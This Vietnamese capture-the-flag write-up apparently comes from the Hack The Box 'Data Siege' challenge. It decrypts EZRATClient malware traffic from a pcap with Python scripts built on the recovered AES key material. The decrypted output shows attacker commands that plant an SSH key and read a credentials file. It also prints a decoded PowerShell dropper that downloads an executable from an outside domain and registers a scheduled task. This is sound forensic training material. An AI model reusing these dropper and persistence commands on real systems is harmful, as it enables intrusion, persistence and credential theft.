# data siege-htb-med(mã độc EZRATClient-http-encode tcp payload)

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image.png)

Bài này chúng ta nhận được 1 file pcap khi mở file pcap này lên và thoe dõi http stream chúng ta sẽ thấy có truy cập vào thư mục gì đó và có 1 file .exe được yêu cầu

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image%201.png)

Để đây đã chưa có gì lắm, tiêp khi mà follow theo http stream mọi người sẽ thấy là có 1 đoạn mã từ máy nạn chân yêu cầu tải file exe về và file đấy là 1 file dạng thực thi bắt đầu có vấn đề về fiel này r đó

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image%202.png)

Tiếp đến là follow tcp mình thử thì mọi ngừi sẽ tháy đoạn đầu thì có vẻ chúng ta còn đcọ được nhưng mà về sau thì  nó sẽ là deocde hex thì ra base64 decode base64 thì ra rác nên là tiêp tục không khai thác đc gì tiếp

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image%203.png)

Giowf mình quay sang die để xem file exe

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image%204.png)

nó đc viết bằng c# mình dùng dnspy để mở

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image%205.png)

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image%206.png)

Ở đay mọi người thấy nó là mã nguồn có tên EZRATClient là một lại mã độc hại mọi người có thể đọc thêm bên dưới

[https://github.com/Exo-poulpe/EZRAT/blob/master/EZRATClient/Program.cs](https://github.com/Exo-poulpe/EZRAT/blob/master/EZRATClient/Program.cs)

Nhìn lên code trên thì chúng ta sẽ thấy đucợ 2 hàm xử lý chính 1 cái thì sẽ encode dữ liệu bằng aes sau đó là chx đến base64 còn decrypt là decode base64 sau đó dùng aes giải mã ngược lại

ở đây key và iv tạo bởi hàm Rfc2898DeriveBytes dùng PBKDF2 để sinh key và iv và để có thể sinh thì hàm đó sẽ cần 2 đầu vào là key và mảng byte kia 

Mảng byte đó đổi sang ASCII là:

Very_S3cr3t_S

còn encrypt key thì mọi người lần theo hàm encrypkey là đc

![image.png](data%20siege-htb-med(m%C3%A3%20%C4%91%E1%BB%99c%20EZRATClient-http-encode%20/image%207.png)

giờ mk sẽ viết code decrypt 1 phần của server - máy nạn nhân

```python
from scapy.all import rdpcap, TCP, IP, Raw
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
from collections import defaultdict
import sys

PCAP = sys.argv[1]
C2_IP = "10.10.10.21"
C2_PORT = 1234
PASSWORD = "VYAemVeO3zUDTL6N62kVA"
SALT = b"Very_S3cr3t_S"

def derive():
    x = PBKDF2(PASSWORD.encode(), SALT, dkLen=48)
    return x[:32], x[32:48]

KEY, IV = derive()

def dec_one(b64s):
    data = b64decode(b64s)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(data), 16).decode("latin1", errors="replace")

def get_commands(raw):
    out = []
    num = 0
    i = 0
    while i < len(raw):
        if raw[i] == "§":
            try:
                ln = int(raw[num:i])
                out.append(raw[i+1:i+1+ln])
                i += 1 + ln
                num = i
                continue
            except:
                pass
        i += 1
    return out

pkts = rdpcap(PCAP)
streams = defaultdict(bytearray)

for p in pkts:
    if IP in p and TCP in p and Raw in p:
        ip = p[IP]
        tcp = p[TCP]
        if (ip.src == C2_IP and tcp.sport == C2_PORT) or (ip.dst == C2_IP and tcp.dport == C2_PORT):
            streams[(ip.src, tcp.sport, ip.dst, tcp.dport)] += bytes(p[Raw].load)

for k, data in streams.items():
    text = data.decode("latin1", errors="ignore")
    cmds = get_commands(text)
    if cmds:
        print(f"\n=== {k} ===")
        for c in cmds:
            try:
                print(dec_one(c))
            except Exception as e:
                print("[decrypt fail]", e)
```

```python
➜  data siege python3 1.py capture.pcap

=== ('10.10.10.21', 1234, '10.10.10.22', 49680) ===
getinfo-0
procview;
cmd;C:\;hostname
cmd;C:\;whoami
cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB{c0mmun1c4710n5 >> C:\Users\svc01\.ssh\authorized_keys
cmd;C:\;dir C:\Users\svc01\Documents
cmd;C:\;type C:\Users\svc01\Documents\credentials.txt
lsdrives
lsfiles
lsfiles-C:\
lsfiles-C:\
lsfiles-C:\temp\
upfile;C:\temp\4AcFrqA.ps1
➜  data siege
```

ở đây mọi nguwfio có thẻ thấy 1 số lệnh mà hacker đã dùng ngaoif ra còn có upload file ps1 lệnh này của mình mới là cắt 1 phần thôi vì up load file ps1 nên sẽ còn dữ liệu file ps1 này nx và còn dữ liệu mà máy nạn nhân gưi lên server nx

```python
from scapy.all import rdpcap, IP, TCP, Raw
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad
import ntpath
import sys

PCAP = sys.argv[1] if len(sys.argv) > 1 else "capture.pcap"

C2_IP = "10.10.10.21"
C2_PORT = 1234
PASSWORD = "VYAemVeO3zUDTL6N62kVA"
SALT = b"Very_S3cr3t_S"

blob = PBKDF2(PASSWORD.encode(), SALT, dkLen=48)
KEY, IV = blob[:32], blob[32:48]

def dec_one(b64s):
    data = b64decode(b64s)
    aes = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(aes.decrypt(data), 16).decode("latin1", errors="replace")

def get_commands(raw):
    out, num, i, last_end = [], 0, 0, 0
    while i < len(raw):
        if raw[i] == "§":
            try:
                ln = int(raw[num:i])
                cstart = i + 1
                cend = cstart + ln
                out.append(raw[cstart:cend])
                last_end = cend
                i = cend
                num = i
                continue
            except:
                pass
        i += 1
    return out, last_end

def reassemble(chunks):
    chunks.sort(key=lambda x: (x[0], x[2]))
    if not chunks:
        return b""

    data = bytearray()
    cur = None

    for seq, payload, _ in chunks:
        if cur is None:
            data.extend(payload)
            cur = seq + len(payload)
        elif seq < cur:
            overlap = cur - seq
            if overlap < len(payload):
                data.extend(payload[overlap:])
                cur += len(payload) - overlap
        elif seq == cur:
            data.extend(payload)
            cur += len(payload)
        else:
            data.extend(b"\x00" * (seq - cur))
            data.extend(payload)
            cur = seq + len(payload)

    return bytes(data)

pkts = rdpcap(PCAP)
srv_to_cli, cli_to_srv = [], []

for idx, p in enumerate(pkts):
    if IP in p and TCP in p and Raw in p:
        ip, tcp, payload = p[IP], p[TCP], bytes(p[Raw].load)

        if ip.src == C2_IP and tcp.sport == C2_PORT:
            srv_to_cli.append((tcp.seq, payload, idx))
        elif ip.dst == C2_IP and tcp.dport == C2_PORT:
            cli_to_srv.append((tcp.seq, payload, idx))

srv_data = reassemble(srv_to_cli)
cli_to_srv.sort(key=lambda x: (x[0], x[2]))

print("=== SERVER -> CLIENT commands ===")
cmds, last_end = get_commands(srv_data.decode("latin1", errors="ignore"))
last_plain = None

for i, c in enumerate(cmds):
    try:
        last_plain = dec_one(c)
        print(f"[{i}] {last_plain}")
    except Exception as e:
        print(f"[{i}] decrypt fail: {e}")

if last_plain and last_plain.startswith("upfile;"):
    path = last_plain.split(";", 1)[1]
    name = ntpath.basename(path) if path else "extracted_raw.bin"
    tail = srv_data[last_end:]
    with open(name, "wb") as f:
        f.write(tail)
    print(f"\n[+] Extracted raw uploaded file to: {name} ({len(tail)} bytes)")

print("\n=== CLIENT -> SERVER possible responses ===")
for seq, payload, idx in cli_to_srv:
    s = payload.decode("latin1", errors="ignore").strip("\x00\r\n ")
    if not s:
        continue
    try:
        print(f"[pkt {idx}] {dec_one(s)}")
    except:
        pass
```

```python
➜  data siege python3 1.py capture.pcap
=== SERVER -> CLIENT commands ===
[0] getinfo-0
[1] procview;
[2] cmd;C:\;hostname
[3] cmd;C:\;whoami
[4] cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB{c0mmun1c4710n5 >> C:\Users\svc01\.ssh\authorized_keys
[5] cmd;C:\;dir C:\Users\svc01\Documents
[6] cmd;C:\;type C:\Users\svc01\Documents\credentials.txt
[7] lsdrives
[8] lsfiles
[9] lsfiles-C:\
[10] lsfiles-C:\
[11] lsfiles-C:\temp\
[12] upfile;C:\temp\4AcFrqA.ps1

[+] Extracted raw uploaded file to: 4AcFrqA.ps1 (2048 bytes)

=== CLIENT -> SERVER possible responses ===
[pkt 65] infoback;0;10.10.10.22|SRV01|SRV01\svc01|Windows 10 Enterprise Evaluation|0.1.6.1
[pkt 77] procview;svchost¦2060;svchost¦5316;ApplicationFrameHost¦4920;csrss¦388;svchost¦1372;svchost¦832;VBoxTray¦2748;fontdrvhost¦684;services¦576;svchost¦3528;lsass¦584;svchost¦6872;svchost¦1552;spoolsv¦1748;VBoxService¦1156;svchost¦760;conhost¦4108;svchost¦1152;dllhost¦6864;svchost¦2528;svchost¦1936;Memory Compression¦1428;RuntimeBroker¦4692;svchost¦4112;svchost¦1932;svchost¦748;smss¦284;svchost¦1140;svchost¦6852;svchost¦2320;MicrosoftEdge¦5076;svchost¦1332;svchost¦740;svchost¦3888;conhost¦4896;dwm¦340;java¦6052;svchost¦928;svchost¦3488;YourPhone¦1320;svchost¦1516;dllhost¦4204;SearchUI¦4664;svchost¦328;winlogon¦524;SgrmBroker¦6628;svchost¦2096;svchost¦1504;cmd¦2488;svchost¦1304;NisSrv¦2336;MicrosoftEdgeSH¦5636;svchost¦1104;browser_broker¦4592;svchost¦1100;svchost¦5284;explorer¦4052;svchost¦1164;svchost¦2076;svchost¦1680;aQ4caZ¦7148;svchost¦692;svchost¦100;dumpcap¦3516;MsMpEng¦2260;RuntimeBroker¦4820;svchost¦1272;Microsoft.Photos¦6392;svchost¦3436;fontdrvhost¦676;cmd¦84;taskhostw¦3628;RuntimeBroker¦6188;RuntimeBroker¦1384;java¦7028;MicrosoftEdgeCP¦5592;svchost¦1256;svchost¦3816;csrss¦464;Registry¦68;sihost¦3416;SecurityHealthSystray¦3156;svchost¦6368;svchost¦6564;wininit¦456;ctfmon¦3940;svchost¦1636;SecurityHealthService¦844;svchost¦1040;svchost¦2024;svchost¦6980;svchost¦1628;svchost¦1824;svchost¦1288;wlms¦2216;RuntimeBroker¦5564;svchost¦5364;svchost¦1620;svchost¦2012;svchost¦396;svchost¦6540;RuntimeBroker¦6780;WindowsInternal.ComposableShell.Experiences.TextInput.InputApp¦2200;svchost¦1604;svchost¦788;svchost¦1400;uhssvc¦6824;SearchIndexer¦5532;svchost¦4940;svchost¦3560;svchost¦1392;svchost¦1588;svchost¦1784;wrapper¦2176;svchost¦2568;ShellExperienceHost¦4536;System¦4;conhost¦2368;OneDrive¦1184;svchost¦1472;Idle¦0;
[pkt 81] cmd;C:\;srv01

[pkt 85] cmd;C:\;srv01\svc01

[pkt 89] cmd;C:\;
[pkt 96] cmd;C:\; Volume in drive C is Windows 10
 Volume Serial Number is B4A6-FEC6

 Directory of C:\Users\svc01\Documents

02/28/2024  07:13 AM    <DIR>          .
02/28/2024  07:13 AM    <DIR>          ..
02/28/2024  05:14 AM                76 credentials.txt
               1 File(s)             76 bytes
               2 Dir(s)  24,147,230,720 bytes free

[pkt 100] cmd;C:\;Username: svc01
Password: Passw0rdCorp5421

2nd flag part: _h45_b33n_r357
[pkt 105] lsdrives;C:\|
[pkt 109] lsfiles;C:\;$Recycle.Bin¦2|BGinfo¦2|Boot¦2|Documents and Settings¦2|PerfLogs¦2|Program Files¦2|Program Files (x86)¦2|ProgramData¦2|Recovery¦2|System Volume Information¦2|temp¦2|Users¦2|Windows¦2|bootmgr¦1¦408364|BOOTNXT¦1¦1|BOOTSECT.BAK¦1¦8192|bootTel.dat¦1¦80|pagefile.sys¦1¦738197504|swapfile.sys¦1¦268435456|
[pkt 111] lsfiles;C:\;$Recycle.Bin¦2|BGinfo¦2|Boot¦2|Documents and Settings¦2|PerfLogs¦2|Program Files¦2|Program Files (x86)¦2|ProgramData¦2|Recovery¦2|System Volume Information¦2|temp¦2|Users¦2|Windows¦2|bootmgr¦1¦408364|BOOTNXT¦1¦1|BOOTSECT.BAK¦1¦8192|bootTel.dat¦1¦80|pagefile.sys¦1¦738197504|swapfile.sys¦1¦268435456|
[pkt 115] lsfiles;C:\temp\;aQ4caZ.exe¦1¦29184|
[pkt 121] upfilestop;
```

Out ra mọi người sẽ thấy chúng ta có được 2 mảnh của flag rồi còn một mảnh cuối cùng nx  chưa biết ở đâu

HTB{c0mmun1c4710n5_h45_b33n_r357

Tiếp đến là mình sẽ mở file 4AcFrqA.ps1 lên đọc thử

```python
➜  data siege cat 4AcFrqA.ps1
powershell.exe -encoded "CgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwBpAG4AZABvAHcAcwBsAGkAdgBlAHUAcABkAGEAdABlAHIALgBjAG8AbQAvADQAZgB2AGEALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIAKQAKAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIACgAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ARABhAGkAbAB5ACAALQBBAHQAIAAyADoAMAAwAEEATQAKAAoAJABzAGUAdAB0AGkAbgBnAHMAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAZQB0AHQAaQBuAGcAcwBTAGUAdAAKAAoAIwAgADMAdABoACAAZgBsAGEAZwAgAHAAYQByAHQAOgAKAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAwAHIAMwBkAF8AMQBuAF8ANwBoADMAXwBoADMANABkAHEAdQA0AHIANwAzAHIANQB9ACIAIAAtAEEAYwB0AGkAbwBuACAAJABhAGMAdABpAG8AbgAgAC0AVAByAGkAZwBnAGUAcgAgACQAdAByAGkAZwBnAGUAcgAgAC0AUwBlAHQAdABpAG4AZwBzACAAJABzAGUAdAB0AGkAbgBnAHMACgA="
AcABkAGEAdABlAHIALgBjAG8AbQAvADQAZgB2AGEALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIAKQAKAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIACgAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ARABhAGkAbAB5ACAALQBBAHQAIAAyADoAMAAwAEEATQAKAAoAJABzAGUAdAB0AGkAbgBnAHMAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAZQB0AHQAaQBuAGcAcwBTAGUAdAAKAAoAIwAgADMAdABoACAAZgBsAGEAZwAgAHAAYQByAHQAOgAKAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAwAHIAMwBkAF8%                       ➜  data siege echo 'CgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwBpAG4AZABvAHcAcwBsAGkAdgBlAHUAcABkAGEAdABlAHIALgBjAG8AbQAvADQAZgB2AGEALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIAKQAKAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIACgAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ARABhAGkAbAB5ACAALQBBAHQAIAAyADoAMAAwAEEATQAKAAoAJABzAGUAdAB0AGkAbgBnAHMAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAZQB0AHQAaQBuAGcAcwBTAGUAdAAKAAoAIwAgADMAdABoACAAZgBsAGEAZwAgAHAAYQByAHQAOgAKAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAwAHIAMwBkAF8AMQBuAF8ANwBoADMAXwBoADMANABkAHEAdQA0AHIANwAzAHIANQB9ACIAIAAtAEEAYwB0AGkAbwBuACAAJABhAGMAdABpAG8AbgAgAC0AVAByAGkAZwBnAGUAcgAgACQAdAByAGkAZwBnAGUAcgAgAC0AUwBlAHQAdABpAG4AZwBzACAAJABzAGUAdAB0AGkAbgBnAHMACgA=' | base64 -d

(New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/4fva.exe", "C:\Users\svc01\AppData\Roaming\4fva.exe")

$action = New-ScheduledTaskAction -Execute "C:\Users\svc01\AppData\Roaming\4fva.exe"

$trigger = New-ScheduledTaskTrigger -Daily -At 2:00AM

$settings = New-ScheduledTaskSettingsSet

# 3th flag part:

Register-ScheduledTask -TaskName "0r3d_1n_7h3_h34dqu4r73r5}" -Action $action -Trigger $trigger -Settings $settings
➜  data siege 
```

Ở đây sau khi đọc file thấy có 2 đonạ mã base64 thì mình decode và có được phần cuối flag

HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}
